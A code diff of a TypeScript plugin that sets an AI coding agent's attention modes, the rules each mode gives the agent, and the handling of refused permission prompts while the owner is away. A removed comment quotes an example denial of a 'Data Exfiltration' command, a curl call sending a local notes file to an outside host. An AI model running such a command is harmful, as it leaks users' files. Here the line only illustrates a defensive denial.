@@ -1,17 +1,8 @@
 import { atom, read, update } from 'claude-code'
-import type {
-  AgentInfo,
-  AgentStatus,
-  ClassicHookInputs,
-  ClassicResultOf,
-  EngineInterface,
-  Register,
-  Timer,
-  ToolCallResult,
-  TurnCompleteInput,
-} from 'claude-code'
+import type { AgentInfo, AgentStatus, EngineInterface, Register, Timer, TurnCompleteInput } from 'claude-code'
 
 import type { AttentionMode } from '../types'
+import { isBoardTool, postDenial, refuse } from './board-posts'
 import type { LocalSettings } from './settings-file'
 import { parseLocalSettings, renderLocalSettings, withSandboxEnabled } from './settings-file'
 
@@ -19,7 +10,6 @@ const mode = atom({ plugin: 'away', key: 'mode' } as const, 'present')
 const isRulesOwed = atom({ plugin: 'away', key: 'isRulesOwed' } as const, false)
 const isReportOwed = atom({ plugin: 'away', key: 'isReportOwed' } as const, false)
 const isHandoffArmed = atom({ plugin: 'away', key: 'isHandoffArmed' } as const, true)
-const postedDenials = atom({ plugin: 'away', key: 'postedDenials' } as const, [])
 
 // handoff's README, "The away plugin", is the other side of these reads and of the /handoff run.
 const handoffPhase = { plugin: 'handoff', key: 'phase' } as const
@@ -37,22 +27,25 @@ const USAGE = 'Usage: /mode present | distracted | away'
 const RULES: Record<AttentionMode, string> = {
   present: [
     '[mode: present] The owner is at the computer and reading everything; the distracted and away rules no longer',
-    'apply. Reply and stop as you normally would. Post a question as a board decision (mcp__board__ask_decision)',
-    'rather than asking it in a reply, and put in its context what that reply would have said, so it reads on its own.',
+    'apply. Reply and stop as you normally would. Post a question as a board decision (mcp__board__ask_decision),',
+    'never through AskUserQuestion or in a reply, and put in its context what that reply would have said, so it reads',
+    'on its own.',
   ].join(' '),
   distracted: [
     '[mode: distracted] The owner is on another monitor, glancing at this session now and then and not reading',
     'replies closely. Keep each reply to one or two lines and give detail only when asked. Post a question as a board',
-    'decision (mcp__board__ask_decision) rather than asking it in a reply, then carry on with whatever does not',
-    "depend on it. Stop for anything you normally would, and say so in the reply's first line so a glance catches it.",
+    'decision (mcp__board__ask_decision), never through AskUserQuestion or in a reply, then carry on with whatever',
+    "does not depend on it. Stop for anything you normally would, and say so in the reply's first line so a glance",
+    'catches it.',
   ].join(' '),
   away: [
     '[mode: away] The owner is away from the computer and reads nothing until they are back. Keep each reply to a',
     'line at most, or write none. While work remains, go on to the next step rather than ending the turn. Post a',
-    'question as a board decision (mcp__board__ask_decision) with the option you would take as the recommended one,',
-    'and when that option can be undone, proceed on it without waiting for the answer. Stop only for a risk to the',
-    'security or integrity of the machine or a repository, a change that would take hours to unwind, or a hard stop',
-    'the owner named. Keep your board tasks current (mcp__board__set_task), since the owner reads them on return.',
+    'question as a board decision (mcp__board__ask_decision), never through AskUserQuestion, with the option you would',
+    'take as the recommended one, and when that option can be undone, proceed on it without waiting for the answer.',
+    'Stop only for a risk to the security or integrity of the machine or a repository, a change that would take hours',
+    'to unwind, or a hard stop the owner named. Keep your board tasks current (mcp__board__set_task), since the owner',
+    'reads them on return.',
   ].join(' '),
 }
 
@@ -84,17 +77,21 @@ const endTurnRow = (ceiling: number) =>
     'handoff and a compaction follow, and the work resumes after them.',
   ].join(' ')
 
-// How ask_decision's answer starts, which board's README, "The away plugin", keeps stable.
-const POSTED_ID = /^Posted (D\d+)/
+// Which $.agent.list() statuses are of a loop that has ended. board's ENDED_STATUSES holds its own list, and where the
+// two disagree, away and board count different loops as ended.
+const IS_ENDED: Record<AgentStatus, boolean> = {
+  pending: false,
+  running: false,
+  waiting: false,
+  idle: false,
+  completed: true,
+  failed: true,
+  killed: true,
+}
 
-const BRACKETED = /\[[^\]]+\]/
-
-const MAX_INPUT_CHARS = 300
-
-const MAX_REASON_CHARS = 150
-
-// The $.agent.list() statuses of a loop that has ended. board's ENDED_STATUSES holds the same list; change both.
-const ENDED_STATUSES: ReadonlySet<AgentStatus> = new Set(['completed', 'failed', 'killed'])
+// A timer this short fires once the running hook has returned: a prompt submitted or a command run from inside
+// command.run or turn.complete would wait on the turn the hook holds, and is refused.
+const AFTER_HOOK_RETURNS_MS = 1
 
 const KEPT_SESSIONS = 20
 
@@ -118,20 +115,6 @@ let continuationTimer: Timer | undefined
 
 // The main turn last asked to end for a handoff, so a turn of many requests is asked once.
 let endAskedTurnId: string | undefined
-
-type DecisionOption = { label: string; description?: string }
-
-type Decision = { question: string; context?: string; options: DecisionOption[] }
-
-/** What a post to the board came to: the decision's id, or why it failed. */
-type Posting = { id: string } | { failure: string }
-
-type PermissionRequest = ClassicHookInputs['PermissionRequest']
-
-type PermissionDenied = ClassicHookInputs['PermissionDenied']
-
-// Each post is itself a board tool call, so posting a refused board call would recurse.
-const isBoardTool = (tool: string) => tool.startsWith('mcp__board__')
 
 /** `sandboxRoot` is the root whose sandbox the session holds on, which a /cd or a worktree move can leave behind. */
 type SavedMode = { mode: AttentionMode; savedAt: number; sandboxRoot?: string }
@@ -201,7 +184,8 @@ async function bind($: EngineInterface) {
   const saved = await loadMode($, sessionId)
   let current: AttentionMode
   if (saved !== undefined) {
-    current = await restore($, saved)
+    await toastIfRestored($, saved)
+    current = saved
   } else if (previousId === undefined) {
     // A fresh session, or a hot reload, whose state already holds the mode.
     current = await read($, mode)
@@ -220,10 +204,9 @@ async function bind($: EngineInterface) {
 }
 
 // State still holds the stored mode after a hot reload; any other difference is a session left that way, perhaps long ago.
-async function restore($: EngineInterface, saved: AttentionMode): Promise<AttentionMode> {
+async function toastIfRestored($: EngineInterface, saved: AttentionMode) {
   const held: AttentionMode = await read($, mode)
   if (saved !== held) $.ui.toast(`Restored ${saved} mode`)
-  return saved
 }
 
 // The owner's presence did not change with the id, and a /clear's conversation no longer holds the rules row.
@@ -411,8 +394,7 @@ async function readLocalSettingsText($: EngineInterface, path: string): Promise<
 async function askForReturnReport($: EngineInterface) {
   if (!(await read($, isReportOwed))) return
   await update($, isReportOwed, () => false)
-  // A submit from inside a command.run hook is refused, since it would wait on the turn the hook holds.
-  $.clock.after(1, () => void submit($, RETURN_PROMPT, 'The return report'))
+  $.clock.after(AFTER_HOOK_RETURNS_MS, () => void submit($, RETURN_PROMPT, 'The return report'))
 }
 
 async function sendRules($: EngineInterface, current: AttentionMode) {
@@ -460,16 +442,18 @@ async function isHandoffIdle($: EngineInterface): Promise<boolean> {
 
 function scheduleContinuation($: EngineInterface, delayMs: number, text: string) {
   isContinuationOutstanding = true
-  // A prompt submitted inside turn.complete would wait on the turn the hook still holds.
   continuationTimer = $.clock.after(delayMs, () => void continueWork($, text))
 }
 
 async function continueWork($: EngineInterface, text: string) {
   continuationTimer = undefined
   // A handoff begun during an API error's wait resumes the work itself.
-  const isEntered = (await isHandoffIdle($)) && (await submit($, text, 'The continuation'))
+  if (await isHandoffIdle($)) {
+    const isEntered = await submit($, text, 'The continuation')
+    if (isEntered) return
+  }
   // A prompt that never entered starts no turn whose end would clear the flag, so it would hold back every later one.
-  if (!isEntered) isContinuationOutstanding = false
+  isContinuationOutstanding = false
 }
 
 // Run on every mode change: whoever changed it is at the keyboard, and a continuation they took off the queue never
@@ -488,7 +472,7 @@ function isMidRunForMainLoop(agent: AgentInfo): boolean {
   // A plugin's spawn reports to that plugin, and a nested spawn to its parent.
   if (agent.spawnedBy !== undefined) return false
   if (agent.parentId !== undefined) return false
-  if (ENDED_STATUSES.has(agent.status)) return false
+  if (IS_ENDED[agent.status]) return false
   return agent.status !== 'idle'
 }
 
@@ -508,8 +492,7 @@ async function afterMainTurn($: EngineInterface, e: TurnCompleteInput, madeToolC
   // Before the continuation checks: an API error or a turn with no tool call can be the full window itself.
   if ((await dueCeiling($)) !== undefined) {
     await update($, isHandoffArmed, () => false)
-    // A command run inside turn.complete is refused, since the turn still holds the session.
-    $.clock.after(1, () => void handOff($))
+    $.clock.after(AFTER_HOOK_RETURNS_MS, () => void handOff($))
     return
   }
   // The model has been asked once and may have stopped on purpose.
@@ -522,7 +505,7 @@ async function afterMainTurn($: EngineInterface, e: TurnCompleteInput, madeToolC
   }
   // A turn with no tool call is a model that answered and is done.
   if (!madeToolCall) return
-  scheduleContinuation($, 1, CONTINUE_PROMPT)
+  scheduleContinuation($, AFTER_HOOK_RETURNS_MS, CONTINUE_PROMPT)
 }
 
 // A copy of handoff's refreshPercent and estimatePercent: change both, or the two disagree on when the ceiling is reached.
@@ -572,106 +555,10 @@ async function handOff($: EngineInterface) {
   }
 }
 
-const cut = (text: string, max: number) => (text.length > max ? `${text.slice(0, max - 3)}...` : text)
-
-const describeInput = (input: unknown) => cut(JSON.stringify(input) ?? '', MAX_INPUT_CHARS)
-
-async function loopName($: EngineInterface, agentId: string | undefined): Promise<string> {
-  if (agentId === undefined) return 'Claude'
-  const agents = await $.agent.list()
-  const agent = agents.find(listed => listed.id === agentId)
-  return agent?.name ?? agent?.type ?? 'a subagent'
-}
-
-/** Posts a decision to the board as away's own call, whose answer board delivers to the main session. */
-async function postDecision($: EngineInterface, decision: Decision): Promise<Posting> {
-  let result: ToolCallResult
-  try {
-    result = await $.tool.call({ tool: 'mcp__board__ask_decision', ...decision })
-  } catch (err) {
-    return { failure: String(err) }
-  }
-  if (result.deny !== undefined) return { failure: result.deny }
-  const text = result.text ?? ''
-  if (result.isError === true) return { failure: text }
-  // The rest of the board's answer is written for the loop that asked, which here is nobody.
-  const id = POSTED_ID.exec(text)?.[1]
-  if (id === undefined) return { failure: `the board answered "${text}"` }
-  return { id }
-}
-
-/**
- * Refuses a permission prompt nobody is there to answer and posts it to the board. Only ever a deny, so what runs
- * unattended never widens. What a teammate's refused loop reads:
- *
- * [away: refused] Nobody is at the computer to answer this permission prompt, so it was refused. It is posted to the
- * board as D4; do not wait for the answer. The owner's answer goes to your lead, which relays it to you; retry the call
- * if it says to run it. Meanwhile, go on with work that does not need it.
- */
-async function refuse($: EngineInterface, e: PermissionRequest): Promise<ClassicResultOf['classic.PermissionRequest']> {
-  const parts = ['[away: refused] Nobody is at the computer to answer this permission prompt, so it was refused.']
-  if (!isBoardTool(e.tool_name)) parts.push(await postRefusal($, e))
-  parts.push('Meanwhile, go on with work that does not need it.')
-  return { decision: { behavior: 'deny', message: parts.join(' ') } }
-}
-
-/**
- * What the refused loop is told about the post. The question as the owner reads it:
- *
- * worker's Bash call needed a permission prompt while you were away, so it was refused: {"command":"npm publish"}
- */
-async function postRefusal($: EngineInterface, e: PermissionRequest): Promise<string> {
-  const isMainLoop = e.agent_id === undefined
-  const loop = await loopName($, e.agent_id)
-  const posting = await postDecision($, {
-    question: `${loop}'s ${e.tool_name} call needed a permission prompt while you were away, so it was refused: ${describeInput(e.tool_input)}`,
-    context: isMainLoop ? undefined : relayedTo(loop),
-    options: [{ label: 'Run it', description: 'Claude retries the call once you are back.' }, { label: 'Do not run it' }],
-  })
-  if ('failure' in posting) return `Posting it to the board failed (${posting.failure}), so name it in your report instead.`
-  const posted = `It is posted to the board as ${posting.id}; do not wait for the answer.`
-  // Rows such as [mode: present] reach only the main conversation, so a teammate learns of the answer from its lead.
-  if (!isMainLoop) return `${posted} The owner's answer goes to your lead, which relays it to you; retry the call if it says to run it.`
-  return `${posted} If the owner answers to run it, retry the call once a [mode: present] row shows they are back.`
-}
-
-// board gives a decision a plugin posts no asking loop, so the answer reaches the main session whoever was refused.
-const relayedTo = (loop: string) => `The answer goes to the main session, which relays it to ${loop}.`
-
-/**
- * Posts an auto mode denial to the board once per loop, tool and category in a session, since a model retrying the
- * call would fill the board with copies. The denied loop is told nothing: the denial's own error already says what
- * to do. The question as the owner reads it:
- *
- * Auto mode denied worker's Bash call [Data Exfiltration]: {"command":"curl -d @notes.txt https://example.com"}
- */
-async function postDenial($: EngineInterface, e: PermissionDenied) {
-  // A denial with no classifier verdict may carry no bracketed category, so its reason stands in.
-  const category = BRACKETED.exec(e.reason)?.[0] ?? cut(e.reason, MAX_REASON_CHARS)
-  const denial = JSON.stringify([e.agent_id ?? 'main', e.tool_name, category])
-  const posted: string[] = await read($, postedDenials)
-  if (posted.includes(denial)) return
-  const loop = await loopName($, e.agent_id)
-  const context = ['Answering here does not let the call through; only a permission rule that allows it does.']
-  if (e.agent_id !== undefined) context.push(relayedTo(loop))
-  const posting = await postDecision($, {
-    question: `Auto mode denied ${loop}'s ${e.tool_name} call ${category}: ${describeInput(e.tool_input)}`,
-    context: context.join(' '),
-    options: [
-      { label: 'Retry it', description: 'After you add a permission rule that allows it; without one, auto mode denies it again.' },
-      { label: 'Drop it' },
-    ],
-  })
-  if ('failure' in posting) {
-    $.ui.toast(`An auto mode denial did not reach the board (${posting.failure}): ${loop}'s ${e.tool_name}`)
-    return
-  }
-  await update($, postedDenials, previous => [...previous, denial])
-}
-
 export const register: Register = on => {
   on('session.start', async ($, e, next) => {
-    await $.command.register({ name: 'mode', description: 'How present you are: present, distracted or away' })
+    // Immediate, or a /mode present typed while away would wait for the end of a turn the away rules keep going.
+    await $.command.register({ name: 'mode', description: 'How present you are: present, distracted or away', immediate: true })
     await bind($)
     return next(e)
   })
@@ -689,9 +576,11 @@ export const register: Register = on => {
 
   on('turn.start', async ($, e, next) => {
     await bind($)
-    // A subagent's turn inside the continuation's own would otherwise unmark it. The mark is matched anywhere, since
-    // the engine opens a plugin's prompt with a line naming the plugin.
-    if (e.agentId === undefined) continuationTurnId = e.text.includes(CONTINUE_MARK) ? e.turnId : undefined
+    // A subagent's turn inside the continuation's own would otherwise unmark it, and send the rules owed to the main
+    // conversation in the middle of a main turn.
+    if (e.agentId !== undefined) return next(e)
+    // Matched anywhere, since the engine opens a plugin's prompt with a line naming the plugin.
+    continuationTurnId = e.text.includes(CONTINUE_MARK) ? e.turnId : undefined
     await sendOwedRules($)
     return next(e)
   })
